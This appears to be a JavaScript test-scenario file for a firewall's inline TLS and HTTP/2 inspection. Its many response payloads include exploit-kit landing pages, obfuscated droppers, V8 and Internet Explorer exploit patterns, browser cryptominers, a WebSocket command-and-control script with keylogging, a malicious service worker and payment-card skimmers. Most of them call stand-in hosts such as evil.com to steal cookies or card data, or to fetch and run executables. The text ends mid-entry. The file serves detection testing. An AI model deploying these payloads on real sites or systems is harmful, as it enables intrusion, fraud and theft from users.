// Sandbox Detection Test Scenarios
// Tests whether inline TLS/HTTP inspection correctly detects and sandboxes/blocks
// known malicious JavaScript, exploit kits, and dynamic content in server responses.
//
// Categories:
//   SB — Sandbox Detection (TLS), client-side
//   AO — Sandbox Detection (HTTP/2), client-side
//
// Architecture: Client POSTs payload to well-behaved echo server → server echoes
// the payload back as the HTTP response body. The firewall/IPS inspecting the
// response direction should detect the malicious content and block or sandbox it.

const crypto = require('crypto');

// ─── Helper: generate large JS padding ──────────────────────────────────────
function jsPad(size) {
  // Realistic-looking minified JS filler
  const vars = [];
  let i = 0;
  while (Buffer.byteLength(vars.join('')) < size) {
    vars.push(`var _${i.toString(36)}=${JSON.stringify(crypto.randomBytes(32).toString('hex'))};`);
    i++;
  }
  return vars.join('');
}

// ─── Response Payload Definitions ────────────────────────────────────────────
// Each: { id, name, description, data: Buffer|string, contentType, severity }

const RESPONSE_PAYLOADS = [

  // ── Exploit Kit Landing Pages ────────────────────────────────────────────
  {
    id: 'ek-rig-landing',
    name: 'RIG Exploit Kit landing page',
    description: 'RIG EK landing page with obfuscated JS loader and iframe chain (64KB)',
    contentType: 'text/html',
    data: `<!DOCTYPE html><html><head><title>Loading...</title></head><body>
<script>var _0x4f2a=['\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f','\\x2f\\x67\\x61\\x74\\x65\\x2e\\x70\\x68\\x70','\\x73\\x72\\x63'];
(function(){var _0xd3=[_0x4f2a[0]+'evil.com'+_0x4f2a[1]];var _0xe=document['createElement']('iframe');
_0xe[_0x4f2a[2]]=_0xd3[0];_0xe['style']['display']='none';document['body']['appendChild'](_0xe);})();
${jsPad(50000)}
var _0xcheck=navigator['plugins'];for(var i=0;i<_0xcheck['length'];i++){
if(_0xcheck[i]['name'].indexOf('Flash')>-1||_0xcheck[i]['name'].indexOf('Java')>-1||_0xcheck[i]['name'].indexOf('Silverlight')>-1){
var _0xpay=document.createElement('script');_0xpay.src='https://evil.com/payload/'+btoa(navigator.userAgent);
document.head.appendChild(_0xpay);}}</script></body></html>`,
    severity: 'critical',
  },
  {
    id: 'ek-angler-landing',
    name: 'Angler Exploit Kit landing page',
    description: 'Angler EK style multi-stage landing with Flash/Silverlight detection (64KB)',
    contentType: 'text/html',
    data: `<!DOCTYPE html><html><body>
<script type="text/javascript">
try{var pl=navigator.plugins;var d=new Date();var ref=document.referrer;
var _0x5a2e=function(a,b){var c=[];for(var d=0;d<a.length;d++){c.push(String.fromCharCode(a.charCodeAt(d)^b.charCodeAt(d%b.length)));}return c.join('');};
var _key='${crypto.randomBytes(16).toString('hex')}';
var _enc='${Buffer.from('document.write("<object classid=\\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\\"><param name=\\"movie\\" value=\\"https://evil.com/exploit.swf\\"/></object>")').toString('base64')}';
eval(atob(_enc));
${jsPad(50000)}
var img=new Image();img.src='https://evil.com/track?r='+encodeURIComponent(ref)+'&p='+pl.length+'&t='+d.getTime();
}catch(e){}</script></body></html>`,
    severity: 'critical',
  },
  {
    id: 'ek-magnitude-landing',
    name: 'Magnitude Exploit Kit landing page',
    description: 'Magnitude EK style with VBScript exploit and encoded payloads (48KB)',
    contentType: 'text/html',
    data: `<!DOCTYPE html><html><head>
<script language="VBScript">
On Error Resume Next
Set obj = CreateObject("Msxml2.XMLHTTP")
obj.Open "GET", "http://evil.com/payload.exe", False
obj.Send
Set stream = CreateObject("Adodb.Stream")
stream.Type = 1
stream.Open
stream.Write obj.ResponseBody
stream.SaveToFile "C:\\Users\\Public\\update.exe", 2
CreateObject("WScript.Shell").Run "C:\\Users\\Public\\update.exe"
</script>
<script>
${jsPad(40000)}
</script></head><body></body></html>`,
    severity: 'critical',
  },
  {
    id: 'ek-neutrino-landing',
    name: 'Neutrino Exploit Kit landing page',
    description: 'Neutrino EK style with browser fingerprinting and conditional exploits (48KB)',
    contentType: 'text/html',
    data: `<!DOCTYPE html><html><body><div id="c"></div>
<script>
(function(){var w=window,d=document,n=navigator;var fp={};
fp.ua=n.userAgent;fp.pl=[];for(var i=0;i<n.plugins.length;i++)fp.pl.push(n.plugins[i].name);
fp.lang=n.language;fp.tz=new Date().getTimezoneOffset();fp.scr=screen.width+'x'+screen.height;
fp.java=n.javaEnabled();fp.cookie=n.cookieEnabled;
var canvas=d.createElement('canvas');var gl=canvas.getContext('webgl');
if(gl){fp.gpu=gl.getParameter(gl.RENDERER);}
fp.mime=[];for(var j=0;j<n.mimeTypes.length;j++)fp.mime.push(n.mimeTypes[j].type);
${jsPad(35000)}
var x=new XMLHttpRequest();x.open('POST','https://evil.com/gate.php',true);
x.setRequestHeader('Content-Type','application/json');
x.onreadystatechange=function(){if(x.readyState==4&&x.status==200){eval(x.responseText);}};
x.send(JSON.stringify(fp));})();</script></body></html>`,
    severity: 'critical',
  },
  {
    id: 'ek-sundown-landing',
    name: 'Sundown Exploit Kit landing page',
    description: 'Sundown EK with PNG steganography loader pattern (32KB)',
    contentType: 'text/html',
    data: `<!DOCTYPE html><html><body>
<img id="steg" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" style="display:none">
<canvas id="c" style="display:none"></canvas>
<script>
var img=document.getElementById('steg');var c=document.getElementById('c');
var ctx=c.getContext('2d');img.onload=function(){c.width=img.width;c.height=img.height;
ctx.drawImage(img,0,0);var d=ctx.getImageData(0,0,c.width,c.height).data;
var payload='';for(var i=0;i<d.length;i+=4){payload+=String.fromCharCode(d[i]);}
eval(payload);};img.src=img.src;
${jsPad(25000)}
</script></body></html>`,
    severity: 'critical',
  },

  // ── Large Obfuscated JavaScript Malware ──────────────────────────────────
  {
    id: 'js-obfuscated-eval-chain',
    name: 'Obfuscated JS eval chain (128KB)',
    description: 'Multi-layer eval/atob chain typical of JS malware droppers',
    contentType: 'application/javascript',
    data: `(function(){
var _0x${crypto.randomBytes(3).toString('hex')}=[${Array.from({length: 50}, (_, i) => `'\\x${(0x60+i).toString(16)}'`).join(',')}];
var _decode=function(s){return decodeURIComponent(escape(atob(s)));};
var _stage1='${Buffer.from(`var x=new XMLHttpRequest();x.open('GET','https://evil.com/stage2.js',false);x.send();eval(x.responseText);`).toString('base64')}';
var _stage2=_decode(_stage1);
${jsPad(120000)}
try{new Function(_stage2)();}catch(e){}
})();`,
    severity: 'critical',
  },
  {
    id: 'js-obfuscated-array-rotate',
    name: 'Obfuscated JS with array rotation (96KB)',
    description: 'JavaScript obfuscation using string array with rotation function',
    contentType: 'application/javascript',
    data: `var _0xabc=['push','shift','${Buffer.from('document.cookie').toString('base64')}',
'${Buffer.from('https://evil.com/exfil').toString('base64')}','createElement','script','src',
'head','appendChild','XMLHttpRequest','open','send','responseText'];
(function(arr,num){var rotate=function(n){while(--n){arr['push'](arr['shift']());}};rotate(num);}(_0xabc,0x5));
var _0x=function(i){return atob(_0xabc[i]);};
${jsPad(85000)}
try{var _c=eval(_0x(0));var _u=_0x(1);var x=new XMLHttpRequest();x.open('POST',_u,true);x.send(_c);}catch(e){}`,
    severity: 'critical',
  },
  {
    id: 'js-obfuscated-jsfuck',
    name: 'JSFuck-style obfuscated payload (64KB)',
    description: 'JavaScript using JSFuck encoding (only []()!+ characters) for evasion',
    contentType: 'application/javascript',
    data: `// JSFuck encoded: alert(1)
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])()
${jsPad(55000)}`,
    severity: 'high',
  },
  {
    id: 'js-packed-dean-edwards',
    name: 'Dean Edwards packer obfuscated JS (64KB)',
    description: 'JS using Dean Edwards packer (eval/function/p,a,c,k,e,d pattern)',
    contentType: 'application/javascript',
    data: `eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('0 1=2 3();1.4("5","6://7.8/9.a",b);1.c();d(1.e)',16,16,'var|x|new|XMLHttpRequest|open|GET|https|evil|com|payload|js|false|send|eval|responseText'.split('|'),0,{}))
${jsPad(55000)}`,
    severity: 'critical',
  },

  // ── Browser Exploit CVE Payloads ─────────────────────────────────────────
  {
    id: 'cve-2021-21224-v8-tyconf',
    name: 'CVE-2021-21224 V8 type confusion',
    description: 'Chrome V8 type confusion exploit pattern with JIT spray (32KB)',
    contentType: 'text/html',
    data: `<script>
// CVE-2021-21224 — V8 Integer overflow in V8
function jit_spray() {
  function trigger(arr) {
    let x = arr.length;
    x = (x >>> 0) - 1;
    x = Math.max(x, 0);
    arr[x] = 1.1;
    x = (x >>> 0) - 1;
    x = Math.max(x, 0);
    arr[x] = 1.1;
  }
  let arr = new Array(1);
  arr[0] = 1.1;
  for (let i = 0; i < 100000; i++) trigger(arr);
  let oob_arr = [1.1, 2.2, 3.3];
  trigger(oob_arr);
  return oob_arr;
}
${jsPad(25000)}
var corrupted = jit_spray();
var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var u32 = new Uint32Array(buf);
f64[0] = corrupted[4];
</script>`,
    severity: 'critical',
  },
  {
    id: 'cve-2021-30551-v8-tyconf',
    name: 'CVE-2021-30551 V8 type confusion',
    description: 'Chrome V8 type confusion in Map transitions exploit pattern (32KB)',
    contentType: 'text/html',
    data: `<script>
// CVE-2021-30551 — Type confusion in V8
function pwn() {
  class Base { constructor() { this.x = 1; } }
  class Derived extends Base { constructor() { super(); this.y = 2; } }
  function trigger(obj) {
    obj.x = 1.1;
    let tmp = {a: obj};
    return obj.x;
  }
  for (let i = 0; i < 50000; i++) trigger(new Derived());
  ${jsPad(25000)}
  let victim = new Derived();
  victim.__proto__ = {};
  let leaked = trigger(victim);
  var shellcode = new Uint8Array([0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2,
    0x48, 0x31, 0xc0, 0xb0, 0x3b, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00]);
}
pwn();
</script>`,
    severity: 'critical',
  },
  {
    id: 'cve-2022-1096-v8-tyconf',
    name: 'CVE-2022-1096 V8 type confusion in Runtime',
    description: 'Chrome V8 type confusion in Runtime exploit pattern (32KB)',
    contentType: 'text/html',
    data: `<script>
// CVE-2022-1096 — V8 Type Confusion
var buf = new ArrayBuffer(0x100);
var victim_arr = [1.1, 2.2, 3.3, 4.4];
function opt_me(x) {
  victim_arr[0] = x;
  class C extends x { constructor() { super(); } }
  return C;
}
for (var i = 0; i < 100000; i++) { opt_me(class {}); }
${jsPad(25000)}
var fake_obj = opt_me(1.1);
var dv = new DataView(buf);
for (var i = 0; i < 0x100; i += 4) { dv.setUint32(i, 0x41414141, true); }
</script>`,
    severity: 'critical',
  },
  {
    id: 'cve-2023-2033-v8-tyconf',
    name: 'CVE-2023-2033 V8 type confusion',
    description: 'Chrome V8 type confusion exploit pattern (32KB)',
    contentType: 'text/html',
    data: `<script>
// CVE-2023-2033 — V8 Type Confusion
function exploit() {
  let arr = new Array(0x10);
  arr.fill(1.1);
  function vuln(a, b) {
    a[0] = b;
    return a[0];
  }
  for (let i = 0; i < 100000; i++) vuln(arr, 1.1);
  ${jsPad(25000)}
  let oob = vuln(arr, {valueOf() { arr.length = 0; return 1.1; }});
  let rwx_page = new WebAssembly.Instance(new WebAssembly.Module(
    new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,6,1,4,0,65,42,11])
  )).exports.main;
}
exploit();
</script>`,
    severity: 'critical',
  },
  {
    id: 'cve-2024-0519-v8-oob',
    name: 'CVE-2024-0519 V8 OOB memory access',
    description: 'Chrome V8 out-of-bounds memory access exploit pattern (32KB)',
    contentType: 'text/html',
    data: `<script>
// CVE-2024-0519 — V8 Out of bounds memory access
function exploit() {
  const arr = [1.1, 2.2, 3.3, 4.4, 5.5];
  function trigger(a) {
    let idx = -1;
    if (a) idx = 0xfffffffe;
    return arr[idx];
  }
  for (let i = 0; i < 100000; i++) trigger(false);
  ${jsPad(25000)}
  let leaked = trigger(true);
  let buf = new ArrayBuffer(8);
  let f64 = new Float64Array(buf);
  let u64 = new BigUint64Array(buf);
  f64[0] = leaked;
  let addr = u64[0];
}
exploit();
</script>`,
    severity: 'critical',
  },
  {
    id: 'cve-2021-26411-ie-uaf',
    name: 'CVE-2021-26411 IE use-after-free',
    description: 'Internet Explorer use-after-free double-free exploit pattern (16KB)',
    contentType: 'text/html',
    data: `<html><head>
<script>
// CVE-2021-26411 — Internet Explorer Memory Corruption
var arr = new Array(0x100);
for (var i = 0; i < arr.length; i++) arr[i] = document.createElement("div");
var attr = document.createAttribute("aaa");
attr.nodeValue = "bbb";
arr[0].setAttributeNode(attr);
arr[0].removeAttributeNode(attr);
${jsPad(10000)}
CollectGarbage();
for (var i = 1; i < arr.length; i++) {
  arr[i].className = new Array(0x40/2).join("\\u4141");
}
try { attr.nodeValue = "trigger"; } catch(e) {}
</script></head><body></body></html>`,
    severity: 'critical',
  },

  // ── Cryptominer Scripts ──────────────────────────────────────────────────
  {
    id: 'miner-coinhive-full',
    name: 'CoinHive miner full script (128KB)',
    description: 'Complete CoinHive browser cryptominer with WebSocket pool connection',
    contentType: 'application/javascript',
    data: `// CoinHive Miner v7.0.0
var CoinHive=CoinHive||{};CoinHive.CONFIG={LIB_URL:"https://coinhive.com/lib/",
WEBSOCKET_SHARDS:[["wss://ws001.coinhive.com/proxy"],["wss://ws002.coinhive.com/proxy"]],
ASMJS_NAME:"cn.js",REQUIRES_AUTH:false,WEBSOCKET_PING_INTERVAL:60,
WEBSOCKET_RECONNECT_DELAY:2000};
CoinHive.Miner=function(siteKey,params){this._siteKey=siteKey;this._params=params||{};
this._threads=[];this._hashes=0;this._currentJob=null;this._running=false;
this._ws=null;};
CoinHive.Miner.prototype.start=function(){this._running=true;this._connectWs();
for(var i=0;i<(this._params.threads||navigator.hardwareConcurrency||4);i++){
this._threads.push(this._createWorker());}};
CoinHive.Miner.prototype._connectWs=function(){var self=this;
var shard=CoinHive.CONFIG.WEBSOCKET_SHARDS[0][0];
this._ws=new WebSocket(shard);this._ws.onmessage=function(e){
var msg=JSON.parse(e.data);if(msg.type==='job'){self._currentJob=msg.params;
self._threads.forEach(function(t){t.postMessage(msg.params);});}};
this._ws.onopen=function(){self._ws.send(JSON.stringify({type:'auth',params:{site_key:self._siteKey,type:'anonymous',user:null,goal:0}}));};};
CoinHive.Miner.prototype._createWorker=function(){var blob=new Blob(['self.onmessage=function(e){/* CryptoNight hash */}'],{type:'application/javascript'});
return new Worker(URL.createObjectURL(blob));};
${jsPad(110000)}
var miner=new CoinHive.Miner('${crypto.randomBytes(32).toString('hex')}');miner.start();`,
    severity: 'critical',
  },
  {
    id: 'miner-webmine-pool',
    name: 'WebMinePool miner script (64KB)',
    description: 'WebMinePool browser mining script with Monero pool',
    contentType: 'application/javascript',
    data: `// WebMinePool Monero Miner
var WMP={pool:"wss://webmine.cz/worker",siteKey:"${crypto.randomBytes(20).toString('hex')}",
autoThreads:true,throttle:0.3};
WMP.start=function(){var t=navigator.hardwareConcurrency||4;
var workers=[];for(var i=0;i<t;i++){
var w=new Worker(URL.createObjectURL(new Blob(['importScripts("https://webmine.cz/worker/cn.js");'+
'self.onmessage=function(e){var r=Module.ccall("cryptonight_hash","string",["string"],[e.data.input]);'+
'self.postMessage({nonce:e.data.nonce,result:r});}'],{type:'text/javascript'})));
workers.push(w);}
var ws=new WebSocket(WMP.pool);ws.onmessage=function(e){var job=JSON.parse(e.data);
workers.forEach(function(w){w.postMessage(job);});};
ws.onopen=function(){ws.send(JSON.stringify({method:"login",params:{login:WMP.siteKey,pass:"x"}}));};};
${jsPad(50000)}
WMP.start();`,
    severity: 'critical',
  },
  {
    id: 'miner-deepminer',
    name: 'deepMiner script (64KB)',
    description: 'deepMiner CryptoNight browser miner with pool proxy',
    contentType: 'application/javascript',
    data: `// deepMiner - Monero (XMR) miner
var deepMiner={socket:null,threads:[],hashesPerSecond:0,totalHashes:0,
throttleMiner:0,workers:[],
start:function(pool,wallet){
this.socket=new WebSocket(pool);
this.socket.onopen=function(){deepMiner.socket.send(JSON.stringify({
identifier:"handshake",pool:"moneroocean.stream",login:wallet,password:"x",
userid:""}));};
this.socket.onmessage=function(event){var data=JSON.parse(event.data);
if(data.identifier==="job"){deepMiner.startMining(data);}};
var numThreads=navigator.hardwareConcurrency||4;
for(var i=0;i<numThreads;i++){var worker=new Worker('/worker.js');
worker.onmessage=function(e){if(e.data.identifier==="solved"){
deepMiner.socket.send(JSON.stringify(e.data));}
deepMiner.totalHashes++;};deepMiner.workers.push(worker);}},
startMining:function(job){this.workers.forEach(function(w){
w.postMessage({identifier:"job",blob:job.blob,target:job.target,job_id:job.job_id});});}};
${jsPad(50000)}
deepMiner.start("wss://evil.com:8892/","${crypto.randomBytes(48).toString('hex')}");`,
    severity: 'critical',
  },
  {
    id: 'miner-wasm-cryptonight',
    name: 'WebAssembly CryptoNight miner (32KB)',
    description: 'WASM-based CryptoNight hash function for browser mining',
    contentType: 'application/javascript',
    data: `// WASM CryptoNight Miner
var Module={wasmBinary:new Uint8Array([0,97,115,109,1,0,0,0,1,12,2,96,3,127,127,127,1,127,96,0,0,
2,15,1,3,101,110,118,6,109,101,109,111,114,121,2,0,1,3,3,2,0,1,7,17,2,4,104,97,115,104,0,0,
5,115,116,97,114,116,0,1,10,${crypto.randomBytes(500).toString('hex').match(/.{1,2}/g).map(h => parseInt(h, 16) % 128).join(',')}]).buffer};
function startMining(pool, wallet) {
  var ws = new WebSocket(pool);
  ws.binaryType = 'arraybuffer';
  ws.onopen = function() { ws.send(JSON.stringify({method:'login',params:{login:wallet,pass:'x',agent:'browser/1.0'}})); };
  ws.onmessage = function(e) {
    var data = JSON.parse(e.data);
    if (data.method === 'job' || data.result) {
      var job = data.params || data.result;
      var input = new Uint8Array(76);
      for (var i = 0; i < job.blob.length; i += 2) input[i/2] = parseInt(job.blob.substr(i, 2), 16);
      var output = new Uint8Array(32);
      Module.ccall('hash', 'number', ['array', 'array', 'number'], [input, output, input.length]);
      ws.send(JSON.stringify({method:'submit',params:{id:job.id,job_id:job.job_id,nonce:'00000000',result:Array.from(output).map(b=>b.toString(16).padStart(2,'0')).join('')}}));
    }
  };
}
${jsPad(20000)}
startMining('wss://evil.com/pool', '4${crypto.randomBytes(47).toString('hex')}');`,
    severity: 'critical',
  },

  // ── Malicious JavaScript Droppers ────────────────────────────────────────
  {
    id: 'js-dropper-fetch-eval',
    name: 'JS dropper via fetch+eval (64KB)',
    description: 'JavaScript dropper that fetches and evaluates remote payload',
    contentType: 'application/javascript',
    data: `(function(){
var endpoints=['https://cdn-evil.com/analytics.js','https://tracking-evil.com/pixel.js',
'https://cdn-evil.net/jquery.min.js','https://evil.com/bundle.js'];
${jsPad(55000)}
function load(url){return fetch(url).then(function(r){return r.text();}).then(function(code){
try{(new Function(code))();}catch(e){}return code;}).catch(function(){return '';});}
var idx=Math.floor(Math.random()*endpoints.length);
load(endpoints[idx]).then(function(c){if(!c){load(endpoints[(idx+1)%endpoints.length]);}});
document.addEventListener('DOMContentLoaded',function(){
var s=document.createElement('script');s.src=endpoints[0];s.async=true;
document.head.appendChild(s);});})();`,
    severity: 'critical',
  },
  {
    id: 'js-dropper-websocket',
    name: 'JS dropper via WebSocket C2 (64KB)',
    description: 'JavaScript that opens WebSocket command-and-control channel',
    contentType: 'application/javascript',
    data: `(function(){
var C2='wss://evil.com:8443/ws';var reconnect=5000;var ws;
function connect(){ws=new WebSocket(C2);
ws.onopen=function(){ws.send(JSON.stringify({type:'register',ua:navigator.userAgent,
url:location.href,cookies:document.cookie,localStorage:JSON.stringify(localStorage)}));};
ws.onmessage=function(e){var cmd=JSON.parse(e.data);
switch(cmd.action){
case 'eval':try{var r=eval(cmd.code);ws.send(JSON.stringify({type:'result',data:String(r)}));}catch(e){ws.send(JSON.stringify({type:'error',data:e.message}));}break;
case 'inject':var s=document.createElement('script');s.textContent=cmd.code;document.head.appendChild(s);break;
case 'keylog':document.addEventListener('keypress',function(k){ws.send(JSON.stringify({type:'key',k:k.key,url:location.href}));});break;
case 'screenshot':break;
case 'redirect':location.href=cmd.url;break;
}};
ws.onclose=function(){setTimeout(connect,reconnect);};
ws.onerror=function(){ws.close();};}
${jsPad(50000)}
connect();})();`,
    severity: 'critical',
  },
  {
    id: 'js-dropper-service-worker',
    name: 'Malicious Service Worker installer (48KB)',
    description: 'JavaScript that installs persistent malicious Service Worker',
    contentType: 'application/javascript',
    data: `// Malicious Service Worker Registration
if ('serviceWorker' in navigator) {
  var swCode = 'self.addEventListener("fetch",function(e){' +
    'var url=new URL(e.request.url);' +
    'if(url.pathname.indexOf("/api/")>-1){' +
    'var cloned=e.request.clone();' +
    'cloned.text().then(function(body){' +
    'fetch("https://evil.com/collect",{method:"POST",body:JSON.stringify({url:url.href,data:body,cookies:""})});' +
    '});' +
    '}' +
    'e.respondWith(fetch(e.request));' +
    '});' +
    'self.addEventListener("push",function(e){' +
    'var data=e.data.json();' +
    'if(data.cmd){eval(data.cmd);}' +
    '});';
  var blob = new Blob([swCode], {type: 'application/javascript'});
  var swUrl = URL.createObjectURL(blob);
  ${jsPad(40000)}
  navigator.serviceWorker.register(swUrl, {scope: '/'}).then(function(reg) {
    console.log('SW registered');
  }).catch(function(e) {});
}`,
    severity: 'critical',
  },
  {
    id: 'js-dropper-iframe-sandbox-escape',
    name: 'iframe sandbox escape attempt (32KB)',
    description: 'JavaScript attempting to escape iframe sandbox restrictions',
    contentType: 'text/html',
    data: `<html><body>
<script>
// Sandbox escape techniques
try { top.document; } catch(e) {}
try { parent.postMessage({type:'xss',cookie:document.cookie}, '*'); } catch(e) {}
try {
  var win = window.open('', '_top');
  if (win) { win.location = 'https://evil.com/phish?c=' + encodeURIComponent(document.cookie); }
} catch(e) {}
window.addEventListener('message', function(e) {
  if (e.data && e.data.cmd) { eval(e.data.cmd); }
});
${jsPad(25000)}
// Attempt to access parent window properties
try {
  var frames = window.parent.frames;
  for (var i = 0; i < frames.length; i++) {
    try { var d = frames[i].document; if (d) { d.body.innerHTML += '<img src=https://evil.com/x>'; } } catch(e) {}
  }
} catch(e) {}
</script></body></html>`,
    severity: 'high',
  },

  // ── Credential Harvesting / Formjacking ──────────────────────────────────
  {
    id: 'js-formjacker-magecart',
    name: 'Magecart payment skimmer (64KB)',
    description: 'Full Magecart-style credit card skimmer injected into checkout pages',
    contentType: 'application/javascript',
    data: `// Magecart Group 12 skimmer
(function(){
var exfil='https://cdn-analytics-evil.com/collect';
var selectors=['input[name*="card"]','input[name*="cc"]','input[name*="credit"]',
'input[name*="number"]','input[name*="expir"]','input[name*="cvv"]','input[name*="cvc"]',
'input[name*="security"]','input[name*="billing"]','input[name*="payment"]',
'input[id*="card"]','input[id*="credit"]','input[type="tel"]','input[autocomplete*="cc"]'];
var data={};
${jsPad(50000)}
function harvest(){selectors.forEach(function(s){var els=document.querySelectorAll(s);
els.forEach(function(el){data[el.name||el.id||s]=el.value;});});
if(Object.keys(data).length>3){
var img=new Image();img.src=exfil+'?d='+btoa(JSON.stringify(data))+'&u='+btoa(location.href);
data={};}}
document.addEventListener('submit',function(){harvest();});
document.addEventListener('click',function(e){if(e.target.type==='submit'||e.target.tagName==='BUTTON'){harvest();}});
setInterval(harvest,3000);
var observer=new MutationObserver(function(){harvest();});
observer.observe(document.body,{childList:true,subtree:true});
})();`,
    severity: 'critical',
  },
  {
    id: 'js-formjacker-overlay',
    name: 'Fake payment overlay skimmer (48KB)',
    description: 'JavaScript that overlays a fake payment form to steal credentials',
    contentType: 'application/javascript',
    data: `(function(){
var overlay=document.createElement('div');
overlay.id='__pay_overlay';
overlay.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999999;display:flex;align-items:center;justify-content:center">'+
'<div style="background:white;padding:30px;border-radius:8px;width:400px;box-shadow:0 4px 20px rgba(0,0,0,0.3)">'+
'<h2 style="margin:0 0 20px">Secure Payment</h2>'+
'<form id="__fake_form">'+
'<input name="card" placeholder="Card Number" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px">'+
'<div style="display:flex;gap:10px"><input name="expiry" placeholder="MM/YY" style="flex:1;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px">'+
'<input name="cvv" placeholder="CVV" style="width:80px;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px"></div>'+
'<input name="name" placeholder="Name on Card" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px">'+
'<button type="submit" style="width:100%;padding:12px;background:#4CAF50;color:white;border:none;border-radius:4px;cursor:pointer;margin-top:10px">Pay Now</button>'+
'</form></div></div>';
${jsPad(35000)}
document.body.appendChild(overlay);
document.getElementById('__fake_form').addEventListener('submit',function(e){
e.preventDefault();var fd=new FormData(e.target);var d={};fd.forEach(function(v,k){d[k]=v;});
fetch('https://evil.com/skim',{method:'POST',body:JSON.stringify(d)});
overlay.remove();});
})();`,
    severity: 'critical',
  },

  // ── Malicious Dynamic Content (Flash/Java/ActiveX) ───────────────────────
  {
    id: 'flash-exploit-object',
    name: 'Flash SWF exploit object embed (16KB)',
    description: 'HTML embedding malicious Flash SWF object with ActionScript exploit',
    contentType: 'text/html',
    data: `<html><body>
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="1" height="1">
<param name="movie" value="https://evil.com/exploit.swf">
<param name="allowScriptAccess" value="always">
<param name="FlashVars" value="cmd=eval&payload=${Buffer.from('function(){var x=new XMLHttpRequest();x.open("GET","https://evil.com/shell",false);x.send();eval(x.responseText);}()').toString('base64')}">
<embed src="https://evil.com/exploit.swf" type="application/x-shockwave-flash" width="1" height="1" allowScriptAccess="always">
</object>
${jsPad(10000)}
<script>
try{var ax=new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
if(parseInt(ax.GetVariable("$version").split(" ")[1].split(",")[0])<32){
document.write('<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"><param name="movie" value="https://evil.com/cve-exploit.swf"></object>');
}}catch(e){}
</script></body></html>`,
    severity: 'critical',
  },
  {
    id: 'java-applet-exploit',
    name: 'Malicious Java applet embed (16KB)',
    description: 'HTML with Java applet that downloads and executes payload',
    contentType: 'text/html',
    data: `<html><body>
<applet code="Exploit.class" archive="https://evil.com/exploit.jar" width="0" height="0">
<param name="cmd" value="cmd /c powershell -ep bypass -e ${Buffer.from('IEX(New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")').toString('base64')}">
</applet>
<object type="application/x-java-applet" width="0" height="0">
<param name="code" value="Exploit">
<param name="archive" value="https://evil.com/signed-exploit.jar">
<param name="permissions" value="all-permissions">
</object>
${jsPad(10000)}
<script>
try{var javaEnabled=navigator.javaEnabled();
if(javaEnabled){document.write('<applet code="sun.plugin.util.PluginHTTPInputStream" archive="https://evil.com/jndi-exploit.jar"></applet>');}}catch(e){}
</script></body></html>`,
    severity: 'critical',
  },
  {
    id: 'activex-exploit',
    name: 'ActiveX control exploit (16KB)',
    description: 'HTML with malicious ActiveX controls for command execution',
    contentType: 'text/html',
    data: `<html><body>
<script language="javascript">
try {
  var shell = new ActiveXObject("WScript.Shell");
  shell.Run("cmd /c certutil -urlcache -split -f https://evil.com/payload.exe %TEMP%\\\\svchost.exe && %TEMP%\\\\svchost.exe");
} catch(e) {}
try {
  var fs = new ActiveXObject("Scripting.FileSystemObject");
  var xmlhttp = new ActiveXObject("MSXML2.XMLHTTP");
  xmlhttp.Open("GET", "https://evil.com/payload.exe", false);
  xmlhttp.Send();
  var stream = new ActiveXObject("ADODB.Stream");
  stream.Type = 1; stream.Open();
  stream.Write(xmlhttp.ResponseBody);
  stream.SaveToFile("C:\\\\Windows\\\\Temp\\\\update.exe", 2);
  shell.Run("C:\\\\Windows\\\\Temp\\\\update.exe");
} catch(e) {}
${jsPad(10000)}
</script></body></html>`,
    severity: 'critical',
  },
  {
    id: 'silverlight-exploit',
    name: 'Silverlight exploit XAML (16KB)',
    description: 'HTML with malicious Silverlight application for sandbox escape',
    contentType: 'text/html',
    data: `<html><body>
